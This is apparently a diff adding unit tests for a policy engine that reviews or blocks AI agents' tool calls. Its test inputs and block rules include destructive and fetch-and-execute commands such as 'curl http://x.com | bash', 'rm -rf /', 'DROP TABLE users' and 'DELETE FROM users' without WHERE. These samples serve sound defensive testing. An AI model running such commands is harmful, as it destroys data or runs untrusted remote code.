@@ -38,6 +38,7 @@ import {
   _resetConfigCache,
   getPersistentDecision,
   isDaemonRunning,
+  evaluateSmartConditions,
 } from '../core.js';
 
 // Global spies
@@ -434,6 +435,312 @@ describe('authorizeHeadless — persistent decisions', () => {
 });
 
 // ── isDaemonRunning ───────────────────────────────────────────────────────────
+
+// ── evaluateSmartConditions (unit) ────────────────────────────────────────────
+
+describe('evaluateSmartConditions', () => {
+  const makeRule = (
+    conditions: Parameters<typeof evaluateSmartConditions>[1]['conditions'],
+    conditionMode?: 'all' | 'any'
+  ) => ({
+    tool: '*',
+    verdict: 'review' as const,
+    conditions,
+    conditionMode,
+  });
+
+  it('returns true when conditions array is empty', () => {
+    expect(evaluateSmartConditions({ sql: 'SELECT 1' }, makeRule([]))).toBe(true);
+  });
+
+  it('returns false when args is not an object', () => {
+    expect(evaluateSmartConditions(null, makeRule([{ field: 'sql', op: 'exists' }]))).toBe(false);
+    expect(evaluateSmartConditions('string', makeRule([{ field: 'sql', op: 'exists' }]))).toBe(
+      false
+    );
+  });
+
+  describe('op: exists / notExists', () => {
+    it('exists — returns true when field is present and non-empty', () => {
+      expect(
+        evaluateSmartConditions({ sql: 'SELECT 1' }, makeRule([{ field: 'sql', op: 'exists' }]))
+      ).toBe(true);
+    });
+    it('exists — returns false when field is missing', () => {
+      expect(evaluateSmartConditions({}, makeRule([{ field: 'sql', op: 'exists' }]))).toBe(false);
+    });
+    it('notExists — returns true when field is missing', () => {
+      expect(evaluateSmartConditions({}, makeRule([{ field: 'sql', op: 'notExists' }]))).toBe(true);
+    });
+    it('notExists — returns false when field is present', () => {
+      expect(
+        evaluateSmartConditions({ sql: 'x' }, makeRule([{ field: 'sql', op: 'notExists' }]))
+      ).toBe(false);
+    });
+  });
+
+  describe('op: contains / notContains', () => {
+    it('contains — matches substring', () => {
+      expect(
+        evaluateSmartConditions(
+          { cmd: 'npm run build' },
+          makeRule([{ field: 'cmd', op: 'contains', value: 'npm' }])
+        )
+      ).toBe(true);
+    });
+    it('contains — fails when substring absent', () => {
+      expect(
+        evaluateSmartConditions(
+          { cmd: 'yarn build' },
+          makeRule([{ field: 'cmd', op: 'contains', value: 'npm' }])
+        )
+      ).toBe(false);
+    });
+    it('notContains — true when substring absent', () => {
+      expect(
+        evaluateSmartConditions(
+          { cmd: 'yarn build' },
+          makeRule([{ field: 'cmd', op: 'notContains', value: 'npm' }])
+        )
+      ).toBe(true);
+    });
+  });
+
+  describe('op: matches / notMatches', () => {
+    it('matches — regex hit', () => {
+      expect(
+        evaluateSmartConditions(
+          { sql: 'DELETE FROM users' },
+          makeRule([{ field: 'sql', op: 'matches', value: '^DELETE', flags: 'i' }])
+        )
+      ).toBe(true);
+    });
+    it('matches — regex miss', () => {
+      expect(
+        evaluateSmartConditions(
+          { sql: 'SELECT * FROM users' },
+          makeRule([{ field: 'sql', op: 'matches', value: '^DELETE', flags: 'i' }])
+        )
+      ).toBe(false);
+    });
+    it('notMatches — true when regex does not match', () => {
+      expect(
+        evaluateSmartConditions(
+          { sql: 'SELECT 1' },
+          makeRule([{ field: 'sql', op: 'notMatches', value: '\\bWHERE\\b', flags: 'i' }])
+        )
+      ).toBe(true);
+    });
+    it('notMatches — false when regex matches', () => {
+      expect(
+        evaluateSmartConditions(
+          { sql: 'DELETE FROM t WHERE id=1' },
+          makeRule([{ field: 'sql', op: 'notMatches', value: '\\bWHERE\\b', flags: 'i' }])
+        )
+      ).toBe(false);
+    });
+    it('normalizes whitespace before matching', () => {
+      // Double-space SQL should still be caught
+      expect(
+        evaluateSmartConditions(
+          { sql: 'DELETE  FROM  users' },
+          makeRule([{ field: 'sql', op: 'matches', value: '^DELETE\\s+FROM', flags: 'i' }])
+        )
+      ).toBe(true);
+    });
+    it('returns false for invalid regex (does not throw)', () => {
+      expect(
+        evaluateSmartConditions(
+          { sql: 'x' },
+          makeRule([{ field: 'sql', op: 'matches', value: '[invalid(' }])
+        )
+      ).toBe(false);
+    });
+  });
+
+  describe('conditionMode', () => {
+    it('"all" — requires every condition to pass', () => {
+      const rule = makeRule(
+        [
+          { field: 'sql', op: 'matches', value: '^DELETE', flags: 'i' },
+          { field: 'sql', op: 'notMatches', value: '\\bWHERE\\b', flags: 'i' },
+        ],
+        'all'
+      );
+      expect(evaluateSmartConditions({ sql: 'DELETE FROM users' }, rule)).toBe(true);
+      expect(evaluateSmartConditions({ sql: 'DELETE FROM users WHERE id=1' }, rule)).toBe(false);
+    });
+    it('"any" — requires at least one condition to pass', () => {
+      const rule = makeRule(
+        [
+          { field: 'sql', op: 'matches', value: '^DROP', flags: 'i' },
+          { field: 'sql', op: 'matches', value: '^TRUNCATE', flags: 'i' },
+        ],
+        'any'
+      );
+      expect(evaluateSmartConditions({ sql: 'DROP TABLE users' }, rule)).toBe(true);
+      expect(evaluateSmartConditions({ sql: 'TRUNCATE orders' }, rule)).toBe(true);
+      expect(evaluateSmartConditions({ sql: 'SELECT 1' }, rule)).toBe(false);
+    });
+  });
+
+  describe('dot-notation field paths', () => {
+    it('accesses nested fields', () => {
+      expect(
+        evaluateSmartConditions(
+          { params: { query: { sql: 'DELETE FROM t' } } },
+          makeRule([{ field: 'params.query.sql', op: 'matches', value: '^DELETE', flags: 'i' }])
+        )
+      ).toBe(true);
+    });
+    it('returns false when nested path does not exist', () => {
+      expect(
+        evaluateSmartConditions(
+          { params: {} },
+          makeRule([{ field: 'params.query.sql', op: 'exists' }])
+        )
+      ).toBe(false);
+    });
+  });
+});
+
+// ── evaluatePolicy — smart rules integration ──────────────────────────────────
+
+describe('evaluatePolicy — smart rules', () => {
+  it('default smart rule flags DELETE without WHERE as review', async () => {
+    const result = await evaluatePolicy('execute_sql', { sql: 'DELETE FROM users' });
+    expect(result.decision).toBe('review');
+    expect(result.blockedByLabel).toMatch(/no-delete-without-where/);
+  });
+
+  it('default smart rule flags UPDATE without WHERE as review', async () => {
+    const result = await evaluatePolicy('execute_sql', { sql: 'UPDATE users SET active=0' });
+    expect(result.decision).toBe('review');
+  });
+
+  it('default smart rule allows DELETE with WHERE', async () => {
+    const result = await evaluatePolicy('execute_sql', { sql: 'DELETE FROM orders WHERE id=1' });
+    expect(result.decision).toBe('allow');
+  });
+
+  it('custom smart rule verdict:block returns block decision', async () => {
+    mockProjectConfig({
+      policy: {
+        smartRules: [
+          {
+            name: 'no-curl-pipe',
+            tool: 'bash',
+            conditions: [
+              { field: 'command', op: 'matches', value: 'curl.+\\|.*(bash|sh)', flags: 'i' },
+            ],
+            verdict: 'block',
+            reason: 'curl piped to shell',
+          },
+        ],
+      },
+    });
+    const result = await evaluatePolicy('bash', { command: 'curl http://x.com | bash' });
+    expect(result.decision).toBe('block');
+    expect(result.reason).toMatch(/curl piped to shell/);
+  });
+
+  it('custom smart rule verdict:allow short-circuits all further checks', async () => {
+    mockProjectConfig({
+      policy: {
+        dangerousWords: ['drop'],
+        smartRules: [
+          {
+            tool: 'safe_drop',
+            conditions: [{ field: 'table', op: 'matches', value: '^temp_' }],
+            verdict: 'allow',
+          },
+        ],
+      },
+    });
+    // "drop" is a dangerous word but the smart rule allows it for temp_ tables
+    const result = await evaluatePolicy('safe_drop', { table: 'temp_build_cache' });
+    expect(result.decision).toBe('allow');
+  });
+
+  it('smart rule with glob tool pattern matches correctly', async () => {
+    mockProjectConfig({
+      policy: {
+        smartRules: [
+          {
+            tool: 'mcp__postgres__*',
+            conditions: [{ field: 'sql', op: 'matches', value: '^DROP', flags: 'i' }],
+            verdict: 'block',
+          },
+        ],
+      },
+    });
+    const result = await evaluatePolicy('mcp__postgres__query', { sql: 'DROP TABLE users' });
+    expect(result.decision).toBe('block');
+  });
+
+  it('smart rule does not match different tool', async () => {
+    mockProjectConfig({
+      policy: {
+        smartRules: [
+          {
+            tool: 'bash',
+            conditions: [{ field: 'command', op: 'matches', value: 'rm -rf' }],
+            verdict: 'block',
+          },
+        ],
+      },
+    });
+    // Tool is 'shell', not 'bash' — rule should not match
+    const result = await evaluatePolicy('shell', { command: 'rm -rf /tmp/old' });
+    // Falls through to normal policy — /tmp/ is in sandboxPaths so it's allowed
+    expect(result.decision).toBe('allow');
+  });
+
+  it('user smartRules are appended to defaults (both active)', async () => {
+    mockProjectConfig({
+      policy: {
+        smartRules: [
+          {
+            name: 'block-drop',
+            tool: '*',
+            conditions: [{ field: 'sql', op: 'matches', value: '^DROP', flags: 'i' }],
+            verdict: 'block',
+          },
+        ],
+      },
+    });
+    // Default rule still active (DELETE without WHERE)
+    const deleteResult = await evaluatePolicy('any_tool', { sql: 'DELETE FROM users' });
+    expect(deleteResult.decision).toBe('review');
+
+    // Project rule also active (DROP)
+    const dropResult = await evaluatePolicy('any_tool', { sql: 'DROP TABLE users' });
+    expect(dropResult.decision).toBe('block');
+  });
+});
+
+// ── authorizeHeadless — smart rule hard block ─────────────────────────────────
+
+describe('authorizeHeadless — smart rule hard block', () => {
+  it('returns approved:false without invoking race engine for block verdict', async () => {
+    mockProjectConfig({
+      policy: {
+        smartRules: [
+          {
+            tool: 'bash',
+            conditions: [{ field: 'command', op: 'matches', value: 'rm -rf /' }],
+            verdict: 'block',
+            reason: 'root wipe blocked',
+          },
+        ],
+      },
+    });
+    const result = await authorizeHeadless('bash', { command: 'rm -rf /' });
+    expect(result.approved).toBe(false);
+    expect(result.reason).toMatch(/root wipe blocked/);
+    expect(result.blockedBy).toBe('local-config');
+  });
+});
 
 describe('isDaemonRunning', () => {
   it('returns false when PID file does not exist', () => {
